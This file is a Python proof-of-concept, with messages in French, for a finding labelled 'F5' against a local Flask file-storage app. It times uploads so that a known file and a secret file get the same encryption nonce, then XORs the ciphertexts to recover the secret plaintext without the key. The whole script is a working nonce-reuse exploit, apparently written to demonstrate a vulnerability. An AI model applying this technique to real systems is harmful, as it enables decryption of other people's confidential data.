import io
import time

from app.app import app, STORAGE

USERNAME = "poc_f5_user"
PASSWORD = "poc_f5_password"
KNOWN_PLAINTEXT = b"FICHIER_CONNU: entete standard connu. " + b"A" * 128
SECRET_PLAINTEXT = b"CONFIDENTIEL: contenu de demonstration F5, donnees protegees."

client = app.test_client()

registration = client.post("/register", json={"username": USERNAME, "password": PASSWORD})
if registration.status_code != 201:
    raise SystemExit(f"Inscription impossible ({registration.status_code}); changez USERNAME.")
login = client.post("/login", json={"username": USERNAME, "password": PASSWORD})
if login.status_code != 200:
    raise SystemExit(f"Connexion impossible ({login.status_code}).")
headers = {"Authorization": "Bearer " + login.get_json()["token"]}

def upload(filename, content):
    response = client.post(
        "/upload", headers=headers, content_type="multipart/form-data",
        data={"file": (io.BytesIO(content), filename)},
    )
    if response.status_code != 201:
        raise SystemExit(f"Dépôt échoué ({response.status_code}): {response.get_data(as_text=True)}")
    return response.get_json()["file_id"]

for attempt in range(1, 6):
    while time.time() % 1 > 0.20:
        time.sleep(0.005)
    known_id = upload("known.bin", KNOWN_PLAINTEXT)
    secret_id = upload("secret.bin", SECRET_PLAINTEXT)
    blob_known = STORAGE[known_id]["blob"]
    blob_secret = STORAGE[secret_id]["blob"]
    if blob_known[:12] == blob_secret[:12]:
        break
else:
    raise SystemExit("Pas de collision observée après cinq essais; relancez la PoC.")

c_known = blob_known[12:-16]
c_secret = blob_secret[12:-16]
keystream = bytes(c ^ p for c, p in zip(c_known, KNOWN_PLAINTEXT))
recovered = bytes(c ^ k for c, k in zip(c_secret, keystream))
expected = SECRET_PLAINTEXT[:len(recovered)]

print(f"[+] Essai {attempt}: nonces identiques = {blob_known[:12].hex()}")
print(f"[+] Fichier connu : {known_id}; fichier secret : {secret_id}")
print(f"[+] Partie du clair récupérée sans clé : {recovered!r}")
if recovered != expected:
    raise SystemExit("Échec de vérification : contenus ou blobs inattendus.")
print("[+] F5 démontrée : récupération du texte clair via XOR des ciphertexts.")
